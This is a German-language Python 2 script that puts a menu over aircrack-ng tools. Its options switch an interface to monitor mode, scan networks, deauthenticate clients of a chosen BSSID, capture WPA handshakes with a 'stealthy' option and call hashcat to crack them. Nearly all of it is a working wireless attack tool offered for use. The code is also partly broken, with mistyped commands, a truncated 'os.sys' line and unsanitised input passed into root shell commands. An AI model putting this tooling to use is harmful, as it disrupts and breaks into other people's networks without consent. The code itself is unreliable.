
#-*- coding: utf-8 -*-
import sys
import os
import webbrowser
print (sys.argv)


print("Bitte dieses tool mit Root-Privilegien ausführen")

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    #taken from https://stackoverflow.com/questions/287871/how-to-print-colored-text-in-terminal-in-python

print(bcolors.HEADER + "Updatemechanismus "+ bcolors.ENDC + "bitte warten...")


os.system('apt-get install figlet toilet')
os.system('apt-get install python')
os.system('apt.get install aircrack-ng')
os.system('apt-get updat && apt-get upgrade')
print(bcolors.WARNING + 'HINWEIS: ' + bcolors.ENDC + 'root-Privilegien sind für dieses Script erforderlich!')

if os.geteuid() != 0:
    exit(bcolors.FAIL + "Dieses Script muss als root ausgeführt werden! Versuche es noch einmal und hänge vor den Scriptaufruf ein 'sudo'")

os.system("clear")
os.system('figlet Schnellstart')
print("Schnellstart-script nützlicher Funktionen von DasPinguin")
print(" ")
print(" ")
print(bcolors.WARNING + "WICHTIG Dieses Tool ist in Python 2.7 geschrieben und der Befehl os.system ist an sich nicht sicher, genau wie die Shell selbst!." + bcolors.ENDC)
print(" ")
print(" ")



l = 1
while l == 1:
    print("")
    print(" "  + bcolors.OKBLUE)
    print("(0) Updatemechanismus")
    print("(1) WLAN-Interface wlan0 in Monitormodus umschalten und Kanal festlegen ")
    print("(2) Alle Netzwerke in der Nähe scannen")
    print("(3) Deauthentifiziere ein bestimmtest WLAN per BSSID und aireplay ")
    print("(4) Schalte WLAN0mon zurück in den Manager-Modus")
    print("(5) Schnappe dir einen WPA-Handshake durch airodump (stealth Y/N?)")
    print("(6) Führe Hashcat aus, um die Dateien aus Tool 5 zu knacken" + bcolors.ENDC )
    try:
        varcmd = input("Gib eine Zahl ein oder drücke Ctrl + C ein, um zu beenden : ")

        print("Du hast eingegeben: ") 
        print(varcmd)
        if varcmd > 6:
            print("Eine gültige Zahl eingeben!")
        elif varcmd == 0:
            os.system('apt-get update && apt-get upgrade')
            os.system('apt-get install python')
            os.system('apt-get install figlet toilet')

        elif varcmd == 1:
            airmoncmd = raw_input("Gib ein" + bcolors.OKGREEN + " WLAN-Interface" + bcolors.ENDC + " ein: ")
            chamoncmd = raw_input("Gib einen" + bcolors.OKGREEN + " Kanal 1-16" + bcolors.ENDC + " ein: ")
            os.system('airmon-ng start ' + airmoncmd +" " + chamoncmd)
        elif varcmd == 2:
                os.system('airodump-ng wlan0mon')
        elif varcmd == 3:
            mdk3cmd = raw_input("Gib eine" + bcolors.OKGREEN + " BSSID" + bcolors.ENDC + " ein: ")
            os.system("airmon-ng stop wlan0mon")
            os.system('aireplay-ng --deauth 5 wlan0 -a' + mdk3cmd)
        elif varcmd == 4:
            os.system("airmon-ng stop wlan0mon")
        elif varcmd == 5:
            print(bcolors.WARNING + "WARNUNG " + bcolors.ENDC + "Ohne den 'Unauffällig'-Modus ist das Tool nur für Penetesting geeignet, da diese Methode auffällig ist! Zum Beenden einen ungültigen Wert eintragen")
            stealtcmd = raw_input("Unauffällig? Y/N: ")
            if stealtcmd == "Y":

                wpacmd = raw_input("Gleich öffnet sich das Airodump Interface und du musst warten, bis sich jemand neu mit dem Zielnetzwerk verbindet Gib zuvpr noch die Ziel-" + bcolors.OKGREEN + " BSSID" +bcolors.ENDC+ " ein: ")
                os.system("airodump-ng wlan0mon -w wpahandshake --output-format pcap --bssid " + wpacmd)
            elif stealtcmd == "N":
                wpacmd = raw_input("Gib eine" + bcolors.OKGREEN + " BSSID" +bcolors.ENDC+ " ein: ")

                os.system("aireplay-ng --deauth 5 wlan0 -a " + wpacmd)
                os.system("airodump-ng wlan0mon -w wpahandshake --output-format pcap --bssid " + wpacmd)
            else:
                print("Ungültiger Wert")

        elif varcmd == 6:
            os.system("sudo hashcat --help")
        elif varcmd == 7:
            os.sys

    except NameError:
        print(bcolors.Fail + "Nicht gültiger Eingabewert. Erneut versuchen" + bcolors.ENDC)
    except KeyboardInterrupt:
        print(" ")
        print(bcolors.FAIL + "KeyboardInterrupt" + bcolors.ENDC + " vom Benutzer. Es wird beendet...")
        exit()
    except:
        print(bcolors.FAIL + "Beenden, da vermutlich ein Fehler aufgetreten ist. Falls mit Ctrl + D beendet wurde, ist zu bemerken, dass das Beenden mit Ctrl + C bevorzugt ist")
        exit()
